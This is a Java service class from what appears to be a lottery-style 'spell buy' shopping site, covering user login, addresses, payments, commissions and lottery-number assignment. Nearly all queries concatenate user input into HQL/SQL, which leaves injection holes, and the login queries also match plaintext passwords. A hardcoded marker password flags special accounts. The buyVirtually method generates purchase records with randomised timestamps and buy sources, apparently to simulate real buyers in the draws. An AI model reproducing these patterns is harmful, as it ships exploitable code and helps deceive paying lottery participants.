package com.tech.service.impl;

import java.math.BigDecimal;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.apache.commons.lang3.StringUtils;
import org.json.JSONObject;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Service;

import com.tech.action.RegisterAction;
import com.tech.dao.BaseDAO;
import com.tech.dao.Pagination;
import com.tech.exception.RuleViolationException;
import com.tech.pojo.Collectproduct;
import com.tech.pojo.Commissionpoints;
import com.tech.pojo.Commissionquery;
import com.tech.pojo.Consumerdetail;
import com.tech.pojo.Consumetable;
import com.tech.pojo.Product;
import com.tech.pojo.ProductCart;
import com.tech.pojo.ProductJSON;
import com.tech.pojo.Randomnumber;
import com.tech.pojo.Spellbuyproduct;
import com.tech.pojo.Spellbuyrecord;
import com.tech.pojo.SysConfigure;
import com.tech.pojo.User;
import com.tech.pojo.Userbyaddress;
import com.tech.service.CommissionpointsService;
import com.tech.service.CommissionqueryService;
import com.tech.service.ConsumerdetailService;
import com.tech.service.ConsumetableService;
import com.tech.service.OrderIdService;
import com.tech.service.ProductService;
import com.tech.service.RandomnumberService;
import com.tech.service.SpellbuyproductService;
import com.tech.service.SpellbuyrecordService;
import com.tech.service.UserService;
import com.tech.util.ApplicationListenerImpl;
import com.tech.util.DateUtil;
import com.tech.util.RandomUtil;

@SuppressWarnings({"rawtypes", "unchecked"})
@Service("userService")
public class UserServiceImpl implements UserService
{
  private final static Logger LOG = LoggerFactory.getLogger(UserServiceImpl.class);
  
  @Autowired
  @Qualifier("baseDao")
  BaseDAO baseDao;
  
  @Autowired
  SpellbuyproductService buyProductService;
  @Autowired
  ConsumerdetailService  consDetailService;
  @Autowired
  SpellbuyrecordService  buyRecordService;
  @Autowired
  RandomnumberService    randService;
  @Autowired
  CommissionqueryService comqService;
  @Autowired
  ProductService productService;
  @Autowired
  CommissionpointsService compService;
  @Autowired
  ConsumetableService     consTableService;
  @Autowired
  OrderIdService orderIdService;
  
  public void add(User user)
  {
    baseDao.saveOrUpdate(user);
  }
  
  public void delete(Integer id)
  {
    baseDao.delById(User.class, id);
  }
  
  public User findById(String id)
  {
    return (User)baseDao
    	.loadObject("from User user where user.userId="+Integer.parseInt(id));
  }
  
  @Override
  public User findById(String id, final boolean lock)
  {
	if(lock == false){
		return findById(id);
	}
    final StringBuffer hql = new StringBuffer("from User user where user.userId=");
    hql.append(Integer.parseInt(id));
    return (User)baseDao.loadObject(hql.toString(), "user", true);
  }
  
  public List<User> query(String hql)
  {
    return (List<User>)baseDao.query(hql);
  }
  
  public void update(String hql)
  {
    baseDao.update(hql);
  }
  
  public User phoneLogin(String phone, String userPwd)
  {
    StringBuffer hql = new StringBuffer();
    if ((StringUtils.isNotBlank(phone)) && (StringUtils.isNotBlank(userPwd))) {
      hql.append("from User user where user.phone ='" + phone + "' and user.userPwd ='" + userPwd + "'");
    }
    return (User)baseDao.loadObject(hql.toString());
  }
  
  public User mailLogin(String mail, String userPwd)
  {
    StringBuffer hql = new StringBuffer();
    if ((StringUtils.isNotBlank(mail)) && (StringUtils.isNotBlank(userPwd))) {
      hql.append("from User user where user.mail ='" + mail + "' and user.userPwd ='" + userPwd + "'");
    }
    return (User)baseDao.loadObject(hql.toString());
  }
  
  public User userByName(String userName)
  {
    StringBuffer hql = new StringBuffer("from User user where 1=1");
    if (StringUtils.isNotBlank(userName)) {
      hql.append(" and user.phone='" + userName + "' or user.mail='" + userName + "'");
    }
    return (User)baseDao.loadObject(hql.toString());
  }
  
  public User userByWeixinOpenId(String weixinOpenId)
  {
    StringBuffer hql = new StringBuffer("from User user where 1=1");
    if (StringUtils.isNotBlank(weixinOpenId)) {
      hql.append(" and user.weixinOpenId='" + weixinOpenId + "'");
    }
    return (User)this.baseDao.loadObject(hql.toString());
  }
  
  public User userByWeixinUnionId(String weixinUnionId)
  {
    StringBuffer hql = new StringBuffer("from User user where 1=1");
    if (StringUtils.isNotBlank(weixinUnionId)) {
      hql.append(" and user.weixinUnionId='" + weixinUnionId + "'");
    }
    return (User)this.baseDao.loadObject(hql.toString());
  }
  
  public User userByWebWxOpenId(String webwxOpenId)
  {
    StringBuffer hql = new StringBuffer("from User user where 1=1");
    if (StringUtils.isNotBlank(webwxOpenId)) {
      hql.append(" and user.webWxOpenId='" + webwxOpenId + "'");
    }
    return (User)this.baseDao.loadObject(hql.toString());
  }
  
  public User isCheckName(String userName)
  {
    StringBuffer hql = new StringBuffer("from User user where 1=1");
    if (StringUtils.isNotBlank(userName)) {
      hql.append(" and ((user.phone ='" + userName + "' and user.mobileCheck='0') or (user.mail='" + userName + "' and user.mailCheck='0'))");
    }
    return (User)baseDao.loadObject(hql.toString());
  }
  
  public List getUserbyaddress(String userId)
  {
    StringBuffer hql = new StringBuffer("select us.* from userbyaddress us where us.userId = '" + userId + "'");
    Map<String, Class> entityMap = new HashMap();
    entityMap.put("us", Userbyaddress.class);
    List list = baseDao.sqlQueryEntity(hql, entityMap);
    return list;
  }
  
  public void addAddress(Userbyaddress userbyaddress)
  {
    baseDao.saveOrUpdate(userbyaddress);
  }
  
  public void delAddress(Integer id)
  {
    baseDao.delById(Userbyaddress.class, id);
  }
  
  public Userbyaddress findAddressById(Integer id)
  {
    StringBuffer hql = new StringBuffer("from Userbyaddress userbyaddress where id='" + id + "'");
    return (Userbyaddress)baseDao.loadObject(hql.toString());
  }
  
  public void setDefaultAddress(String userId, Integer id)
  {
    StringBuffer hql = new StringBuffer("update Userbyaddress u set u.status = 0 where u.userId='" + userId + "' and u.id <> '" + id + "'");
    baseDao.update(hql.toString());
  }
  
  public void defaultAddress(String userId, Integer id)
  {
    StringBuffer hql = new StringBuffer("update Userbyaddress u set u.status = 1 where u.userId='" + userId + "' and u.id = '" + id + "'");
    baseDao.update(hql.toString());
  }
  
  public User isUserName(String userName, String userId)
  {
    StringBuffer hql = new StringBuffer("from User user where 1=1");
    if (StringUtils.isNotBlank(userName)) {
      hql.append(" and user.userName='" + userName + "' and user.userId <> '" + userId + "'");
    }
    return (User)baseDao.loadObject(hql.toString());
  }
  
  public List loadAll()
  {
    StringBuffer sql = new StringBuffer("from User u where u.userPwd = '"+User.getMagic()+"'");
    List list = baseDao.find(sql.toString());
    return list;
  }
  
  public User userByIsUserName(String userName)
  {
    StringBuffer hql = new StringBuffer("from User user where user.userName=")
    .append('\'').append(userName).append('\'');
    return (User)baseDao.loadObject(hql.toString());
  }
  
  public User adminUserByUserName(String userName)
  {
    StringBuffer hql = new StringBuffer("from User user where userType = 0 and userName=")
    .append('\'').append(userName).append('\'');
    return (User)baseDao.loadObject(hql.toString());
  }
  
  public Pagination getInvitedList(String userId, int pageNo, int pageSize)
  {
    StringBuffer hql = new StringBuffer("select * from user u where  u.invite = '" + userId + "' order by u.oldDate desc");
    
    Pagination page = new Pagination();
    page.setPageNo(pageNo);
    page.setPageSize(pageSize);
    Map<String, Class> entityMap = new HashMap();
    entityMap.put("u", User.class);
    List list = baseDao.sqlQuery(hql, entityMap, page);
    
    page.setList(list);
    
    return page;
  }
  
  public Pagination getCollectGoodsList(String userId, int pageNo, int pageSize)
  {
    StringBuffer hql = new StringBuffer("select * from collectproduct ct left join product pt on pt.productId = ct.collectProductId left join spellbuyproduct st on st.fkProductId = ct.collectProductId where ct.collectUserId = '" + userId + "'  and st.spStatus = 0  group by ct.collectProductId");
    
    Pagination page = new Pagination();
    page.setPageNo(pageNo);
    page.setPageSize(pageSize);
    Map<String, Class> entityMap = new HashMap();
    entityMap.put("ct", Collectproduct.class);
    entityMap.put("pt", Product.class);
    entityMap.put("st", Spellbuyproduct.class);
    List list = baseDao.sqlQuery(hql, entityMap, page);
    
    page.setList(list);
    
    return page;
  }
  
  public Integer getInvitedListByCount(String userId)
  {
    StringBuffer sql = new StringBuffer("select count(*) from user u where  u.invite = '" + userId + "'");
    return Integer.valueOf(baseDao.getAllNum(sql));
  }
  
  public List getInvitedListByData(String userId)
  {
    StringBuffer hql = new StringBuffer("select u.* from user u where u.invite = '" + userId + "'");
    Map<String, Class> entityMap = new HashMap();
    entityMap.put("u", User.class);
    List list = baseDao.sqlQueryEntity(hql, entityMap);
    return list;
  }
  
  public Pagination adminUserList(String typeId, String keyword, String orderName, int pageNo, int pageSize)
  {
    StringBuffer hql = new StringBuffer("select * from user u where u.userType = 0 and u.userPwd <> 'net.5j9x1.' ");
    if ((StringUtils.isNotBlank(typeId)) && (StringUtils.isNotBlank(keyword)))
    {
      if (typeId.equals("userId")) {
        hql.append(" and u.userId='" + keyword + "'");
      }
      if (typeId.equals("userName")) {
        hql.append(" and u.userName='" + keyword + "'");
      }
      if (typeId.equals("mail")) {
        hql.append(" and u.mail='" + keyword + "'");
      }
      if (typeId.equals("phone")) {
        hql.append(" and u.phone='" + keyword + "'");
      }
    }
    if (StringUtils.isNotBlank(orderName)) {
      hql.append(" order by u." + orderName + " desc");
    } else {
      hql.append(" order by u.oldDate desc");
    }
    StringBuffer sql = new StringBuffer("select count(*) from user u where u.userType = 0 and u.userPwd <> 'net.5j9x1.' ");
    if ((StringUtils.isNotBlank(typeId)) && (StringUtils.isNotBlank(keyword)))
    {
      if (typeId.equals("userId")) {
        sql.append(" and u.userId='" + keyword + "'");
      }
      if (typeId.equals("userName")) {
        sql.append(" and u.userName='" + keyword + "'");
      }
      if (typeId.equals("mail")) {
        sql.append(" and u.mail='" + keyword + "'");
      }
      if (typeId.equals("phone")) {
        sql.append(" and u.phone='" + keyword + "'");
      }
    }
    Pagination page = new Pagination();
    page.setPageNo(pageNo);
    page.setPageSize(pageSize);
    Map<String, Class> entityMap = new HashMap();
    entityMap.put("u", User.class);
    List list = baseDao.sqlQuery(hql, entityMap, page);
    int resultCount = baseDao.getAllNum(sql);
    page.setList(list);
    page.setResultCount(resultCount);
    return page;
  }
  
  public Integer getCountUser()
  {
    StringBuffer sql = new StringBuffer("select count(*) from user");
    return Integer.valueOf(baseDao.getAllNum(sql));
  }
  
  public User isNotOpenId(String openId)
  {
    StringBuffer hql = new StringBuffer("from User user where 1=1");
    if (StringUtils.isNotBlank(openId)) {
      hql.append(" and user.userPwd='" + openId + "' or user.attribute22='" + openId + "'");
    }
    return (User)baseDao.loadObject(hql.toString());
  }
  
  public void delCollectGoods(Integer id)
  {
    baseDao.delById(Collectproduct.class, id);
  }

	@Override
	public BigDecimal totalBalance() {
		StringBuffer hql = new StringBuffer("select sum(u.balance) from user u where u.userType=0 and u.userPwd <> 'net.5j9x1.' ");
		Object result = baseDao.sumQuery(hql.toString());
	    if(null != result){
	    	return (BigDecimal)result;
	    }else{
	    	return new BigDecimal(0);
	    }
	}
	
	@Override
	public BigDecimal totalIntegral() {
		StringBuffer hql = new StringBuffer("select sum(u.commissionPoints) from user u where u.userType=0 and u.userPwd <> 'net.5j9x1.' ");
		Object result = baseDao.sumQuery(hql.toString());
	    if(null != result){
	    	return (BigDecimal)result;
	    }else{
	    	return new BigDecimal(0);
	    }
	}

	@Override
	public User payOrPaid(final String userId, final List<ProductCart> productCartList, final List<ProductJSON> successCartList,
			final Integer userPayType, final String integral, final Integer bankMoney, final String useBalance,
			final String orderno) {
		final int compn = ApplicationListenerImpl.sysConfigureJson.getBuyProduct();
		// paying handler
		final int useba = Integer.parseInt(useBalance), useit = Integer.parseInt(integral);
		final User user = findById(userId, true);
		if(productCartList.size() == 0){
			return user;
		}
		final int curpi = user.getCommissionPoints();
		if (Consumetable.isPayByBalance(userPayType)) {
			// 送积分 - 余额购买
			if(useba > 0){
				payByBalance(user, useba, compn);
				setOrderPaid(orderno);
			}
		} else if (Consumetable.isPayByWelfare(userPayType)) {
			payByIntegral(user, curpi, useit);
			setOrderPaid(orderno);
		} else if (Consumetable.isPayByBalWelf(userPayType)) {
			if (useba > 0) {
				payByBalance(user, useba, compn);
			}
			if (useit >= 100) {
				payByIntegral(user, curpi, useit);
			}
			setOrderPaid(orderno);
		} else if(Consumetable.isPayByCybBank(userPayType)){
			// 余额+积分（当不足时出现在网银支付里）
			if (useba > 0) {
				payByBalance(user, useba, compn);
			}
			if (useit >= 100) {
				payByIntegral(user, curpi, useit);
			}
			// 送积分 - 第三方支付购买
			final int bm = bankMoney;
			final int pi = user.getCommissionPoints();
			user.setCommissionPoints(pi + bm* compn);
			// 只能在第三方支付成功的回调里更新订单支付状态！
		}
		return paid(user, productCartList, successCartList, userPayType, orderno);
	}
	
	private final User payByBalance(final User user, final int useba, final int compn){
		final double curba = user.getBalance();
		if (curba >= useba) {
			final int curpi = user.getCommissionPoints();
			user.setBalance(curba - useba);
			user.setCommissionPoints(curpi + useba * compn);
			user.setUsedBalance(useba);
		} else {
			throw new RuleViolationException("余额不足，支付失败！");
		}
		return user;
	}
	
	private final User payByIntegral(final User user, final int curpi, final int useit){
		if (curpi >= useit) {
			// May added after paying by balance!
			final int pi = user.getCommissionPoints();
			user.setCommissionPoints(pi - useit);
			user.setUsedPoints(useit);
		} else {
			throw new RuleViolationException("积分不足，支付失败！");
		}
		return user;
	}
	
	/**get pointers - record buying-consuming - gen rand after paying. */
	private User paid(final User user, final List<ProductCart> productCartList, final List<ProductJSON> successCartList,
			final Integer userPayType, final String orderno){
		final SysConfigure sconf = ApplicationListenerImpl.sysConfigureJson;
		final String sname = sconf.getShortName();
		final int compn    = sconf.getBuyProduct();
		final double comqn = sconf.getCommission();
		final StringBuilder sbuf = new StringBuilder();
		final Consumetable cons  = consTableService.findByOutTradeNo(orderno);
		for (final ProductCart productCart : productCartList) {
			final int count = productCart.getCount();
			if(count == 0){
				continue;
			}
			// cons-detail
			final Consumerdetail consDetail = new Consumerdetail();
			consDetail.setBuyCount(count);
			consDetail.setBuyMoney(Double.valueOf(count));
			consDetail.setConsumetableId(orderno);
			consDetail.setProductId(productCart.getProductId());
			consDetail.setProductName(productCart.getProductName());
			consDetail.setProductPeriod(productCart.getProductPeriod());
			consDetail.setProductTitle(productCart.getProductTitle());
			// buy - product
			final Spellbuyproduct buyProduct = buyProductService
					.findById(""+productCart.getProductId());
			// 佣金-积分记录
			if (Consumetable.isPayByBalance(userPayType)) {
				// 佣金 - 记录
				recordComsonsIfInvited(sbuf, user, productCart, sname, count, comqn);
				// 积分- 记录
				recordPoints(sbuf, user, buyProduct, sname, count, compn, '+');
			} else if (Consumetable.isPayByWelfare(userPayType)) {
				recordPoints(sbuf, user, buyProduct, sname, count, compn, '-');
			} else if (Consumetable.isPayByBalWelf(userPayType)) {
				if(user.getUsedBalance() > 0){
					recordPoints(sbuf, user, buyProduct, sname, count, compn, '+');
				}
				if(user.getUsedPoints() > 0){
					final int p = user.getUsedPoints()/100;
					recordPoints(sbuf, user, buyProduct, sname, p, compn, '-');
				}
				recordComsonsIfInvited(sbuf, user, productCart, sname, count, comqn);
			} else if (Consumetable.isPayByCybBank(userPayType)) {
				if(user.getUsedPoints() > 0){
					final int p = user.getUsedPoints()/100;
					recordPoints(sbuf, user, buyProduct, sname, p, compn, '-');
				}
				recordPoints(sbuf, user, buyProduct, sname, count, compn, '+');
				recordComsonsIfInvited(sbuf, user, productCart, sname, count, comqn);
			}
			// 购买记录
			final Spellbuyrecord buyRecord = recordSpellbuy(user, buyProduct, count, 0, 
					DateUtil.DateTimeToStrBySSS(new Date()), cons.getBuyIp());
			// gen rand-numbers & lock!!
			generateRandoms(sbuf, user, buyProduct, count, buyRecord);
			// add experiences
			addExperience(user, count);
			// add success cart
			final ProductJSON pjson = new ProductJSON();
			pjson.setBuyDate(buyRecord.getBuyDate());
			pjson.setProductId(buyProduct.getFkProductId());
			pjson.setSpellbuyProductId(buyProduct.getSpellbuyProductId());
			pjson.setProductName(productCart.getProductName());
			pjson.setProductPeriod(productCart.getProductPeriod());
			pjson.setProductTitle(productCart.getProductTitle());
			pjson.setBuyCount(count);
			successCartList.add(pjson);
			consDetailService.add(consDetail);
		}// for-cart-list
		return user;
	}
	
	private final Randomnumber generateRandoms(final StringBuilder sbuf, final User user,
			final Spellbuyproduct buyProduct, final int count, final Spellbuyrecord buyRecord){
		sbuf.setLength(0);
		sbuf.append("from Randomnumber randnr where randnr.productId=")
		.append(buyProduct.getSpellbuyProductId());
		final List<Randomnumber> rands = randService.query(sbuf.toString(), "randnr", true);
		final List<String> orands = new ArrayList<String>();
		for (final Randomnumber r : rands) {
			if (r.getRandomNumber().indexOf(',') != -1) {
				final String[] rs = r.getRandomNumber().split(",");
				for (String string : rs) {
					orands.add(string);
				}
			} else {
				orands.add(r.getRandomNumber());
			}
		}
		final Randomnumber rand = new Randomnumber();
		rand.setProductId(buyProduct.getSpellbuyProductId());
		rand.setRandomNumber(RandomUtil.newRandom(count, buyProduct
				.getSpellbuyPrice().intValue(), orands));
		rand.setSpellbuyrecordId(buyRecord.getSpellbuyRecordId());
		rand.setBuyDate(buyRecord.getBuyDate());
		rand.setUserId(user.getUserId());
		randService.add(rand);
		return rand;
	}
	
	private final User addExperience(final User user, final int buyCount){
		user.setExperience(user.getExperience() + buyCount);
		return user;
	}
	
	private final Spellbuyrecord recordSpellbuy(final User user, final Spellbuyproduct buyProduct,
			final int count, final int buySource, final String buyDate, final String buyIp){
		final Spellbuyrecord buyRecord = new Spellbuyrecord();
		buyRecord.setFkSpellbuyProductId(buyProduct.getSpellbuyProductId());
		buyRecord.setBuyer(user.getUserId());
		buyRecord.setBuyPrice(count);
		buyRecord.setBuyDate(buyDate);
		buyRecord.setSpWinningStatus("0");
		buyRecord.setBuyStatus("0");
		buyRecord.setSpRandomNo("");
		buyRecord.setBuyIp(buyIp);
		if (buyIp == null) {
			buyRecord.setBuyIp("127.0.0.1");
		}
		final String buyLocal = RegisterAction.seeker.getAddress(buyRecord.getBuyIp());
		buyRecord.setBuyLocal(buyLocal);
		buyRecord.setBuySource(Integer.valueOf(buySource));
		buyRecordService.add(buyRecord);
		return buyRecord;
	}
	
	private final Commissionpoints recordPoints(final StringBuilder sbuf, final User user, 
			final Spellbuyproduct buyProduct, final String sname, final int count, 
			final int compn, final char direct){
		sbuf.setLength(0);
		sbuf.append(sname).append("商品编码").append('(')
		.append(buyProduct.getSpellbuyProductId()).append(')');
		final int amount;
		if(direct == '+'){
			sbuf.append("支付").append(count).append("元获得积分");
			amount = count*compn;
		}else{
			sbuf.append("积分抵扣");
			amount = count*100;
		}
		final Commissionpoints comp = new Commissionpoints();
		comp.setDate(DateUtil.DateTimeToStr(new Date()));
		comp.setDetailed(sbuf.toString());
		sbuf.setLength(0);
		sbuf.append(direct).append(amount);
		comp.setPay(sbuf.toString());
		comp.setToUserId(user.getUserId());
		compService.add(comp);
		return comp;
	}

	private final Commissionquery recordComsonsIfInvited(final StringBuilder sbuf, final User user,
			final ProductCart productCart, final String sname, final int count, final double comqn){
		if (user.getInvite() != null) {
			// 获得佣金 - 计算
			sbuf.setLength(0);
			sbuf.append(sname).append("商品编码").append('(')
			.append(productCart.getProductId()).append(')').append("获得佣金");
			final User owner = findById(""+user.getInvite(), true);
			final double add = count * comqn;
			owner.setCommissionCount(owner.getCommissionCount()+add);
			owner.setCommissionBalance(owner.getCommissionBalance()+add);
			final Commissionquery comq = new Commissionquery();
			comq.setBuyMoney(Double.valueOf(count));
			comq.setCommission(add);
			comq.setDate(DateUtil.DateTimeToStr(new Date()));
			comq.setDescription(sbuf.toString());
			comq.setInvitedId(user.getInvite());
			comq.setToUserId(user.getUserId());
			comqService.add(comq);
			return comq;
		}
		return null;
	}
	
	private final Consumetable setOrderPaid(final String orderno){
		final Consumetable cons = consTableService.findByOutTradeNo(orderno, true);
		if(cons.isNotPaid()){
			cons.setPayStatus(Consumetable.PAY_STAT_PAID);
			return cons;
		}
		LOG.warn("pay again!!");
		throw new RuleViolationException("已支付过了");
	}

	@Override
	public User buyVirtually(final User user, final Integer productId, final int buyCount) {
		final List<Object[]> proList = buyProductService.findByProductId(productId, true);
		Product product=null;
		Spellbuyproduct buyProduct=null;
		Object[] objs = (Object[])proList.get(0);
      	if(objs[0] instanceof Product){
      		product = (Product)objs[0];
      		buyProduct = (Spellbuyproduct)objs[1];
      	}else{
      		product = (Product)objs[1];
      		buyProduct = (Spellbuyproduct)objs[0];
      	}
        //Product product = (Product)(proList.get(0)[0]);
        //Spellbuyproduct buyProduct = (Spellbuyproduct)(proList.get(0)[1]);
        final int sbc = buyProduct.getSpellbuyCount();
        // check - buying count
        checkBuyCount(user.getUserId()+"", buyProduct, product, buyCount, null);
        buyProduct.setSpellbuyCount(sbc + buyCount);
        // record - buying
        final Random random = new Random();
        final StringBuilder sbuf = new StringBuilder();
        // - buyDate yyyy-MM-dd HH:mm:ss.SSS
        sbuf.append(new SimpleDateFormat("yyyy-MM-dd HH:mm").format(new Date()))
        .append(':');
        final int s = random.nextInt(60);
        if (s < 10) {
        	sbuf.append('0');
        }
        sbuf.append(s).append('.');
        final int sss = random.nextInt(1000);
        if (sss < 10) {
          sbuf.append('0').append('0');
        } else if (sss < 100) {
        	sbuf.append('0');
        }
        sbuf.append(sss);
        final String buyDate = sbuf.toString();
        // - buySource
        int buySource = new Random().nextInt(2);
        if(buySource>0){
        	buySource = Spellbuyrecord.BUYSRC_WECHAT;
        }
        final Spellbuyrecord buyRecord = recordSpellbuy(user, buyProduct, buyCount, 
        		buySource, buyDate, user.getIpAddress());
        // 获取夺宝码
        generateRandoms(sbuf, user, buyProduct, buyCount, buyRecord);
        // up - experience
        addExperience(user, buyCount);
        add(user);
		return user;
	}
	
	@Override
	public Consumetable addOrder(final String userId, final Map<String, Integer> products, 
			  final List<ProductCart> cartList, final Consumetable consumetable, final String integral) {
		int moneyCount = 0;
		JSONObject withold = new JSONObject();
		for (final Iterator<String> i = products.keySet().iterator(); i.hasNext(); i.remove()) {
			// pro - pid
			final String pid = i.next();
			// pro - selected for paying
			final ProductCart productCart = new ProductCart();
			// pId -> product, spell buy product
			final Spellbuyproduct spellbuyproduct = 
					buyProductService.getByProductId(Integer.parseInt(pid), true);
			final Product product = spellbuyproduct.getProduct();
			// buy-count request
			final int buyingCount = products.get(pid);
			if(buyingCount == 0){
				continue;
			}
			withold.put(pid, buyingCount);
			checkBuyCount(userId, spellbuyproduct, product, buyingCount, productCart);
			moneyCount += buyingCount;
			productCart.init(product, spellbuyproduct, buyingCount, moneyCount);
			cartList.add(productCart);
			final int sbc = spellbuyproduct.getSpellbuyCount();
			spellbuyproduct.setSpellbuyCount(sbc+buyingCount);
		}// for-products
	    consumetable.setWithold(withold.toString());
	    consumetable.setPayStatus(Consumetable.PAY_STAT_NPAID);
	    withold = null;
	    // calc money and select pay-style
	    final double money;
		final int fi = Integer.parseInt(integral);
		if (fi > 0) {
			money = moneyCount - fi / 100;
		} else {
			money = moneyCount;
		}
		consumetable.setBuyCount(moneyCount);
		consumetable.setDate(DateUtil.DateTimeToStr(new Date()));
		consumetable.setMoney(Double.valueOf(money));
		consumetable.setOutTradeNo(orderIdService.addOxid());
		consumetable.setUserId(Integer.valueOf(userId));
		consTableService.add(consumetable);
		return consumetable;
	}
	
	private final void checkBuyCount(final String userId, final Spellbuyproduct spellbuyproduct, 
			final Product product, final int buyingCount, final ProductCart productCart){
		final int sbc = spellbuyproduct.getSpellbuyCount();
		final int sbp = spellbuyproduct.getSpellbuyPrice();
		final int sbl = spellbuyproduct.getSpellbuyLimit().intValue();
		// spell-buy policy: limit?
		if (sbl > 0) {
			int buyedCount = 0;
			List<?> dataList = buyRecordService.getRandomNumberList(
					spellbuyproduct.getSpellbuyProductId().toString(), userId);
			for (Iterator<?> itr = dataList.iterator(); itr.hasNext(); itr.remove()) {
				final Randomnumber rand = (Randomnumber) itr.next();
				final String rands = rand.getRandomNumber();
				++buyedCount;
				for(int k = 0, size = rands.length(); k < size; ++k){
					if(rands.charAt(k) == ','){
						++buyedCount;
					}
				}
			}
			final int limit = sbl - buyedCount;
			if (buyingCount > limit) {
				throw new RuleViolationException(product.getProductName()+"：购买数量超过限制");
			}
			if(productCart != null){
				productCart.setMyLimitSales(limit);
			}
		} else {
			// no limit
			if(productCart != null){
				productCart.setMyLimitSales(Integer.valueOf(0));
			}
		}
		if (sbc + buyingCount > sbp) {
			throw new RuleViolationException(product.getProductName()+"：目前商品数量不足");
		}
	}
	
}
